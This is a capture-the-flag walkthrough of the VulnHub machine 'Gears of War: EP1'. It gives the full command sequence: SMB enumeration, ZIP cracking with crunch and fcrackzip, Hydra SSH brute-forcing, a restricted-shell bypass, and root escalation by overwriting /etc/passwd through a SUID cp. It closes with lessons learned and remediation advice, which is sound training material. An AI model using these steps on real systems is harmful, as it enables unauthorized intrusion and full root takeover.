# Gears of War: EP1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.184 |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Goal** | root flag (`/root/flag.txt`) |
| **Source** | [HackingArticles](https://www.hackingarticles.in/gears-of-war-ep1-vulnhub-walkthrough/) |

## Attack Summary

SMB share exposes a password-protected ZIP and a hint file; crunch generates a targeted wordlist; fcrackzip cracks the ZIP to recover SSH credentials; Hydra identifies the username; SUID `cp` abuse overwrites `/etc/passwd` with a new root-level user.

## Methodology

1. Recon — nmap for open ports
2. Enumeration — SMB share enumeration, file extraction
3. Exploitation — wordlist generation, ZIP cracking, SSH brute-force
4. Privilege Escalation — SUID `cp` to overwrite `/etc/passwd`

## Step 1: Reconnaissance

```bash
netdiscover -r 192.168.1.0/24
```

```bash
nmap -A -p- $TARGET
```

![nmap scan](images/01-nmap.png)

Open ports: **80** (HTTP), **139/445** (SMB), **22** (SSH).

The HTTP service returns nothing useful. SMB is the primary attack surface.

## Step 2: SMB Enumeration

List available shares:

```bash
smbclient -L $TARGET
```

Connect to the identified share:

```bash
smbclient //$TARGET/LOCUS_LAN$
```

Inside the share, download the relevant files:

```bash
get msg_horda.zip
get SOS.txt
```

![smb enumeration](images/02-smb.png)

`SOS.txt` contains a hint about the ZIP password pattern. The pattern indicates a 4-character password using a specific character class.

## Step 3: ZIP Password Cracking

Use crunch to generate a targeted wordlist based on the pattern in `SOS.txt`. The pattern `@%%,` means one lowercase letter followed by two digits and a comma:

```bash
crunch 4 4 -t @%%, -o wordlist
```

Crack the ZIP with fcrackzip:

```bash
fcrackzip -D -u -v -p wordlist msg_horda.zip
```

Password found: **r44M** (adjust based on the actual SOS.txt hint).

Extract the ZIP:

```bash
unzip -P r44M msg_horda.zip
```

The extracted `key.txt` reveals the SSH password: **3_d4y**.

## Step 4: Username Discovery via Hydra

The password is known but not the username. Use Hydra to identify a valid SSH user:

```bash
hydra -L /usr/share/wordlists/rockyou.txt -p 3_d4y -T4 $TARGET ssh
```

![hydra](images/03-hydra.png)

Valid credentials found: `marcus` / `3_d4y`.

## Step 5: SSH Login — Restricted Shell Bypass

Login as marcus:

```bash
ssh marcus@$TARGET
```

The shell is restricted and cannot access sensitive directories. Bypass the restriction by forcing a full Bash shell at connect time:

```bash
ssh marcus@$TARGET -t "bash --noprofile"
```

A full shell is now available.

## Step 6: Privilege Escalation — SUID `cp` Abuse

Search for SUID binaries:

```bash
find /bin -type f -perm -u=s 2>/dev/null
```

The `cp` binary has the SUID bit set, meaning it runs as root regardless of the invoking user.

Generate a password hash for a new root-level user:

```bash
openssl passwd -1 -salt raj pass123
```

Copy `/etc/passwd` to `/tmp` and add a new user entry with UID 0:

```bash
cp /etc/passwd /tmp/passwd
nano /tmp/passwd
# Append the following line (replace the hash with the openssl output above):
# raj:$1$raj$[HASH]:0:0:raj:/root:/bin/bash
```

Overwrite `/etc/passwd` with the modified version using the SUID `cp`:

```bash
cp /tmp/passwd /etc/passwd
```

Switch to the new account:

```bash
su raj
# Password: pass123
id
# uid=0(root) gid=0(root) groups=0(root)
```

![privesc](images/04-privesc.png)

## Step 7: Root Flag

```bash
cd /root
ls -al
cat flag.txt
```

![root flag](images/05-root-flag.png)

## Lessons Learned

1. SMB shares exposed without authentication can leak sensitive archived data even if the archive itself is password-protected.
2. Weak ZIP passwords are crackable in seconds when the length and character pattern can be inferred from a hint file.
3. Setting the SUID bit on `cp` is a critical misconfiguration that allows any user to overwrite any system file as root.
4. A restricted shell (`rbash` or similar) provides minimal security if the user can bypass it through SSH forced command options.

## Remediation

| Vulnerability | Fix |
|---|---|
| Anonymous SMB share access | Require authentication; audit share permissions |
| Weak ZIP password | Use long random passwords for any encrypted archive |
| SUID bit on `cp` | Remove SUID from non-essential binaries; audit with `find / -perm -u=s` |
| Restricted shell bypass | Use SSH `ForceCommand` and disable PTY allocation for restricted users |
| Sensitive file in ZIP on shared drive | Never store credential material in publicly accessible network shares |
